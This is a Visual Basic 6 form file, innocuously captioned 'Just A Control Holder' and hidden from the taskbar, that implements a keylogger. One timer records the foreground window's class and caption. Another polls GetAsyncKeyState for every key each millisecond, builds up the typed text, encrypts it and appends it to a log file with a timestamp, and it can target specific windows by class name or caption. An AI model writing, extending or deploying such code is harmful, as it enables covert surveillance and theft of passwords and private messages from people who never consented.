VERSION 5.00
Begin VB.Form frmControls 
   BorderStyle     =   3  'Fixed Dialog
   Caption         =   "Just A Control Holder"
   ClientHeight    =   810
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   3060
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   810
   ScaleWidth      =   3060
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer tmrChecker 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   1020
      Top             =   60
   End
   Begin VB.Timer tmrLogger 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   240
      Top             =   120
   End
End
Attribute VB_Name = "frmControls"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim db As LogDB
Dim sBuffer As String
Dim lngHandle As Long
Dim sClass As String
Dim sWindowText As String

Private Sub tmrChecker_Timer()
    
    lngHandle = GetForegroundWindow
    sClass = String(1024, Chr(0))
    GetClassName lngHandle, sClass, 1024
    If InStr(sClass, Chr(0)) Then
        sClass = Mid(sClass, 1, InStr(sClass, Chr(0)) - 1)
    End If
    
    sWindowText = String(GetWindowTextLength(lngHandle), Chr(0))
    GetWindowText lngHandle, sWindowText, 1024
    If InStr(sWindowText, Chr(0)) Then
        sWindowText = Mid(sWindowText, 1, InStr(sWindowText, Chr(0)) - 1)
    End If
            
    Select Case LogMode
        Case LogEveryWindow
            tmrLogger.Enabled = True
        
        Case LogByClassName

            
            If bExactMatch = True Then
                If sClass = ExpectedClass Then
                    tmrLogger.Enabled = True
                Else
                    tmrLogger.Enabled = False
                End If
            Else
                If InStr(ExpectedClass, sClass) > 0 Then
                    MsgBox "Class: " & sClass & " Handle: " & lngHandle & " Window Text: " & sWindowText
                    tmrLogger.Enabled = True
                Else
                    tmrLogger.Enabled = False
                End If
            End If
            
        Case LogByWindowText
            If Len(sWindowText) <= 0 Then Exit Sub
            
            If bExactMatch = True Then
                If sWindowText = ExpectedWindowText Then
                    tmrLogger.Enabled = True
                Else
                    tmrLogger.Enabled = False
                End If
            Else
                If InStr(ExpectedWindowText, sWindowText) > 0 Then
                    tmrLogger.Enabled = True
                Else
                    tmrLogger.Enabled = False
                End If
            End If
        
        Case Else
            tmrLogger.Enabled = True
    End Select
    sBuf = "Class: " & sClass & vbCrLf & " Handle: " & lngHandle & vbCrLf & " Window Caption: " & sWindowText & vbCrLf & " Data: " & sBuffer & vbCrLf & " Transformed Data: " & Transform(sBuffer)
    
End Sub

Private Sub tmrLogger_Timer()
Dim nCtr As Integer
Dim sTmp As String
    For nCtr = 0 To 255
        If GetAsyncKeyState(nCtr) = KeyDown Then
            sTmp = GetString(nCtr, GetAsyncKeyState(18), GetAsyncKeyState(17), GetAsyncKeyState(16))
            sBuffer = sBuffer & sTmp
            If sTmp = "[ENTER]" Then
                db.TimeStamp = Now
                db.Data = Enc(sBuffer)
                db.ClassName = sClass
                db.WindowsText = sWindowText
                db.Handle = lngHandle
                Seek FileNumber, LOF(FileNumber) + 1
                Put FileNumber, , db
                sTmp = ""
                sBuffer = ""
            End If
        End If
    Next
End Sub
